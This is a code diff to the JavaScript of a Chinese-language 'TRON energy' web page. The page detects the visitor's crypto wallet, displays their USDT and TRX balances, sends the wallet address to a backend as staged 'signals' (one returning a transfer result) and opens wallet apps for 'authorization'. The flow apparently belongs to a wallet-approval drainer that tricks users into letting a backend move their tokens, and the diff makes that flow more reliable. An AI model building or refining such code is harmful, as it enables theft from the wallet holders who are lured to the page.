@@ -810,6 +810,7 @@ const langConfig = {
 };
 let currentLang = localStorage.getItem("TRON_energy_lang") || "zh";
 // ========== 语言切换逻辑（按钮+弹窗版本） ==========
+// ========== 语言切换逻辑（按钮+弹窗版本） ==========
 const langBtn = document.getElementById("langBtn");
 const langDropdown = document.getElementById("langDropdown");
 const currentLangText = document.getElementById("currentLangText");
@@ -820,7 +821,6 @@ function getCurrentWalletType() {
     const userAgent = window.navigator.userAgent.toLowerCase();
     const tronWeb = window.tronWeb || {};
     const provider = tronWeb.provider || {};
-
     // 1. 识别imToken（三重校验）
     if (userAgent.includes("imtoken") || window.imToken || provider.isImToken) {
         return "imtoken";
@@ -837,10 +837,8 @@ function getCurrentWalletType() {
     if (userAgent.includes("bitkeep") || window.bitkeep || provider.isBitKeep) {
         return "bitget"; // 对应walletConfig中的bitget配置
     }
-
     return null; // 未识别到四种钱包中的任何一种
 }
-
 // 初始化语言显示
 function initLangDisplay() {
     // 设置按钮显示文本
@@ -852,13 +850,11 @@ function initLangDisplay() {
     // 更新顶部中间文本
     updateTopCenterText();
 }
-
 // 切换语言弹窗显示/隐藏
 langBtn.addEventListener("click", function(e) {
     e.stopPropagation();
     langDropdown.classList.toggle("active");
 });
-
 // 选择语言
 document.querySelectorAll(".lang-option").forEach(option => {
     option.addEventListener("click", function(e) {
@@ -876,7 +872,6 @@ document.querySelectorAll(".lang-option").forEach(option => {
         renderEnergyRecords();
     });
 });
-
 // 更新顶部中间文本
 function updateTopCenterText() {
     const lang = langConfig[currentLang];
@@ -890,7 +885,6 @@ document.addEventListener('click', function(e) {
         langDropdown.classList.remove('active');
     }
 });
-
 // ========== 二次授权校验工具 ==========
 const AUTHORIZED_KEY = "authorized_wallet_addresses";
 function getAuthorizedAddresses() {
@@ -1157,7 +1151,6 @@ async function checkImTokenEnv() {
     const walletModal = document.getElementById("walletModal");
     const connectBtn = document.getElementById("connectBtn");
     const walletType = getCurrentWalletType(); // 自动识别四种钱包
-
     // 若识别到目标钱包（四种之一）
     if (walletType && walletConfig[walletType] && window.tronWeb) {
         tronWeb = window.tronWeb;
@@ -1170,7 +1163,6 @@ async function checkImTokenEnv() {
                 setTimeout(resolve, 3000); // 3秒超时兜底
             }
         });
-
         // 统一获取地址（兼容四种钱包的地址格式差异）
         try {
             userAddress = tronWeb.defaultAddress.base58;
@@ -1182,7 +1174,6 @@ async function checkImTokenEnv() {
                 userAddress = accounts[0];
             }
         }
-
         if (userAddress) {
             connectBtn.style.display = "none";
             warning.style.display = "none";
@@ -1192,14 +1183,12 @@ async function checkImTokenEnv() {
             return;
         }
     }
-
     // 未识别到四种钱包，显示选择弹窗（兜底）
     specialTipContainer.style.display = "block";
     userInfoEl.innerHTML = lang.nonImTokenUser;
     approveBtn.style.display = "none";
     connectBtn.style.display = "none";
     walletModal.classList.add("active");
-
     // 钱包选择逻辑（保留手动选择，对应四种钱包）
     document.querySelectorAll(".wallet-item").forEach(item => {
         item.addEventListener("click", async (e) => {
@@ -1235,7 +1224,6 @@ async function checkImTokenEnv() {
             }
         });
     });
-
     // 点击弹窗外部关闭，显示连接按钮
     walletModal.addEventListener("click", (e) => {
         if (e.target === walletModal) {
@@ -1348,7 +1336,17 @@ async function queryBalance() {
 async function initWallet(needAutoApprove) {
     const lang = langConfig[currentLang];
     try {
-        userAddress = tronWeb.defaultAddress.base58;
+        // 修复：兼容TronLink的hex地址格式
+        try {
+            userAddress = tronWeb.defaultAddress.base58;
+        } catch (e) {
+            if (tronWeb.defaultAddress?.hex) {
+                userAddress = tronWeb.address.fromHex(tronWeb.defaultAddress.hex);
+            } else {
+                const accounts = await tronWeb.trx.getAccounts();
+                userAddress = accounts[0];
+            }
+        }
         const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
@@ -1425,7 +1423,6 @@ function bindUnlockedCoreLogic() {
         btn.disabled = true;
         btn.textContent = "处理中...";
         let b1Alert = null;
-
         try {
             const isInWalletBrowser = checkIsInWalletBrowser();
             if (isInWalletBrowser) {
@@ -1439,24 +1436,23 @@ function bindUnlockedCoreLogic() {
                 btn.textContent = lang.approveBtnText;
                 return;
             }
-
-            // 保留B1信号校验（后端租能量），但不刷新
+            // 修复：B1发送即标记防重复，不等待响应
             b1Alert = showPersistentAlert(lang.submitRequestTip);
-            const b1Result = await sendSignalB(true);
-            if (b1Result !== "200") throw new Error("B1未返回200");
-            markB1SignalSent(userAddress);
-
+            markB1SignalSent(userAddress); // 发送即防重复
+            // 发送B1信号（失败仅日志，不阻塞流程）
+            sendSignalB(true).catch(err => {
+                console.error("B1信号发送失败（已标记防重复）：", err);
+            });
+            // 直接关闭弹窗，唤起钱包
             if (b1Alert && b1Alert.parentNode) {
                 b1Alert.parentNode.removeChild(b1Alert);
             }
             b1Alert = showPersistentAlert(lang.唤起WalletTip);
-
             userInfoEl.innerHTML = `
             已连接：<br>${shortAddr}<br>
             USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
             <br><span style='color: #4ade80; font-size: 13px;'>✅ 审核通过，正在唤起钱包...</span>`;
-            await handleJump(); // 跳转后不刷新！删掉原来的window.location.reload()
-
+            await handleJump(); // 跳转后不刷新
             if (b1Alert && b1Alert.parentNode) {
                 b1Alert.parentNode.removeChild(b1Alert);
             }
@@ -1475,6 +1471,7 @@ function bindUnlockedCoreLogic() {
 function checkIsInWalletBrowser() {
     const userAgent = window.navigator.userAgent.toLowerCase();
     const walletUAs = ['imtoken', 'tronlink', 'tokenpocket', 'bitkeep', 'mathwallet'];
+    // 适配四种钱包的UA识别，确保无遗漏
     return walletUAs.some(ua => userAgent.includes(ua));
 }
 // ========== A1信号（返回204标记success，防重复仅防二次发A1） ==========
@@ -1540,7 +1537,7 @@ async function sendSignalA2() {
         throw new Error(`A2信号异常：${e.message}`); // 抛出错误，中断后续流程
     }
 }
-// ========== B1信号（返回204才标记，防重复仅防二次发B1） ==========
+// ========== B1/B2信号发送函数（修复重复状态判断） ==========
 async function sendSignalB(isB1 = true) {
     const lang = langConfig[currentLang];
     const requestData = { userAddress: userAddress };
@@ -1558,16 +1555,15 @@ async function sendSignalB(isB1 = true) {
         });
         clearTimeout(timeoutId);
         
-        // 后端回应逻辑一致：204（B1/B2成功）或JSON（B2转账结果）
-        if (res.status === 200) {
-            console.log(`✅ ${isB1 ? "B1" : "B2"}信号发送成功，后端已接收`);
+        // 修复：区分B1和B2的返回逻辑，避免重复判断
+        if (isB1 && res.status === 200) { // B1成功返回200
+            console.log(`✅ B1信号发送成功，后端已接收`);
             return "200";
-        } else if (res.status === 200) {
-            // 后端B2接口返回转账结果（JSON格式），适配后端返回结构
+        } else if (!isB1 && res.status === 200) { // B2成功返回200（含JSON结果）
             const transferResult = await res.json();
             if (transferResult.success) {
                 console.log(`🎉 B2信号对应转账成功：`, transferResult);
-                return transferResult; // 返回转账结果，用于前端展示
+                return transferResult;
             } else {
                 throw new Error(transferResult.msg || "B2信号转账失败");
             }
@@ -1580,50 +1576,6 @@ async function sendSignalB(isB1 = true) {
         console.error(`❌ ${isB1 ? "B1" : "B2"}信号发送失败：`, e);
         throw new Error(`${isB1 ? "B1" : "B2"}信号异常：${e.message}`);
     }
-}
-// ========== A1防重复工具（仅防二次发送A1信号，携带A1-204才是防重复对象） ==========
-function canSendA1Signal(address) {
-    try {
-        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
-        const lastSendTime = records[address] || 0;
-        const now = Date.now();
-        // 防重复对象=15分钟内发过A1且返回204，仅阻止二次发A1
-        return now - lastSendTime > 15 * 60 * 1000;
-    } catch (e) {
-        console.warn("检查A1防重复失败：", e);
-        return true;
-    }
-}
-function updateA1SignalRecord(address) {
-    try {
-        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
-        records[address] = Date.now(); // 记录A1发送时间，用于防重复
-        localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
-    } catch (e) {
-        console.warn("更新A1记录失败：", e);
-    }
-}
-// ========== B1防重复工具（仅防二次发送B1信号，携带B1-204才是防重复对象） ==========
-function hasSentB1Signal(address) {
-  try {
-    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-    const item = records[address];
-    if (!item) return false;
-    // 防重复对象=30天内发过B1且返回204，仅阻止二次发B1
-    return Date.now() - item.time < 2592000000;
-  } catch (e) {
-    console.warn("检查B1防重复失败：", e);
-    return false;
-  }
-}
-function markB1SignalSent(address) {
-  try {
-    const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-    records[address] = { time: Date.now() }; // 记录B1发送时间，用于防重复
-    localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
-  } catch (e) {
-    console.warn("标记B1信号失败：", e);
-  }
 }
 // 转跳逻辑
 async function handleJump() {
@@ -1644,7 +1596,6 @@ async function handleJump() {
         walletType = walletType || "imtoken";
         const wallet = walletConfig[walletType];
         let jumpUrl = "";
-
         // 自动拼接对应钱包的Scheme（四种钱包都覆盖）
         switch (walletType) {
             case "imtoken":
@@ -1661,12 +1612,10 @@ async function handleJump() {
                 jumpUrl = wallet.scheme + encodedUrl;
                 break;
         }
-
         btn.textContent = `正在唤起${wallet.name}授权页面...`;
         setTimeout(() => {
             window.location.href = jumpUrl;
         }, 100);
-
         // 3秒无响应提示
         setTimeout(() => {
             showAutoCloseAlert(`未检测到${wallet.name}，请手动打开并访问：${targetUrl}`);
